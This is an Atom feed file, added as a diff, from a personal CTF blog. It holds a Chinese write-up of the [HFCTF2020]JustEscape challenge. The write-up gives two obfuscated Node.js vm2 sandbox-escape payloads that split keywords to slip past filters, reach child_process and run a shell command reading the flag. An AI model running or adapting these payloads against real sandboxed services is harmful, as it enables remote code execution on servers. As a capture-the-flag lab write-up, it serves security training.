@@ -1,0 +1,108 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;js-vm沙箱逃逸&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-06-19T13:35:43.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <category term="flask" />
+    <category term="ctf工具安装教程" />
+    <category term="sql注入" />
+    <category term="php绕过open_opedir设置" />
+    <category term="TOTP" />
+    <category term="rce" />
+    <category term="ssti" />
+    <category term="insert截断" />
+    <category term="xss攻击" />
+    <category term="c的预处理" />
+    <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <category term="sql injection" />
+    <category term="文件上传(头像上传)" />
+    <category term="session反序列化" />
+    <category term="ssrf" />
+    <category term="HTTP走私攻击" />
+    <category term="json数据unicode转码绕过" />
+    <category term="对sqlite的sql注入" />
+    <category term="未理解" />
+    <category term="命令执行" />
+    <category term="zip软链接" />
+    <category term="python_seed函数" />
+    <category term="session伪造" />
+    <category term="js-vm沙箱逃逸" />
+    <entry>
+        <id>http://odiws.github.io/2024/06/19/HFCTF2020-JustEscape/</id>
+        <title>[HFCTF2020]JustEscape</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/06/19/HFCTF2020-JustEscape/"/>
+        <content type="html">&lt;h2 id=&#34;hfctf2020justescape&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hfctf2020justescape&#34;&gt;#&lt;/a&gt; [HFCTF2020]JustEscape&lt;/h2&gt;
+&lt;p&gt;题目说真的不是 PHP 吗？&lt;br&gt;
+十有八九不是，猜测可能是 Java，结果是 js。&lt;/p&gt;
+&lt;h4 id=&#34;用errorstack看一下报错信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用errorstack看一下报错信息&#34;&gt;#&lt;/a&gt; 用 &lt;code&gt;Error().stack&lt;/code&gt; , 看一下报错信息。&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BHFCTF2020%5DJustEscape/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;报错显示是 &lt;code&gt;vm.js&lt;/code&gt; ，考的 vm 沙箱逃逸。&lt;br&gt;
+POC 参考：&lt;br&gt;
+https://&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1naXRodWImYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;github&lt;/span&gt;.com/patriksimek/vm2/issues/225&lt;br&gt;
+payload1:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(function ()&amp;#123;
+    TypeError[`$&amp;#123;`$&amp;#123;`prototyp`&amp;#125;e`&amp;#125;`][`$&amp;#123;`$&amp;#123;`get_pro`&amp;#125;cess`&amp;#125;`] = f=&amp;gt;f[`$&amp;#123;`$&amp;#123;`constructo`&amp;#125;r`&amp;#125;`](`$&amp;#123;`$&amp;#123;`return proc`&amp;#125;ess`&amp;#125;`)();
+    try&amp;#123;
+        Object.preventExtensions(Buffer.from(``)).a = 1;
+    &amp;#125;catch(e)&amp;#123;
+        return e[`$&amp;#123;`$&amp;#123;`get_pro`&amp;#125;cess`&amp;#125;`](()=&amp;gt;&amp;#123;&amp;#125;).mainModule[`$&amp;#123;`$&amp;#123;`requir`&amp;#125;e`&amp;#125;`](`$&amp;#123;`$&amp;#123;`child_proces`&amp;#125;s`&amp;#125;`)[`$&amp;#123;`$&amp;#123;`exe`&amp;#125;cSync`&amp;#125;`](`cat /flag`).toString();
+    &amp;#125;
+&amp;#125;)()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;payload2：（join 拼接字符串）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(()=&amp;gt;&amp;#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&amp;gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&amp;#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &amp;#125;catch(e)&amp;#123; return e[`a`](()=&amp;gt;&amp;#123;&amp;#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); &amp;#125; &amp;#125;)()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BHFCTF2020%5DJustEscape/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获得 flag&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="js-vm沙箱逃逸" />
+        <updated>2024-06-19T13:35:43.000Z</updated>
+    </entry>
+</feed>
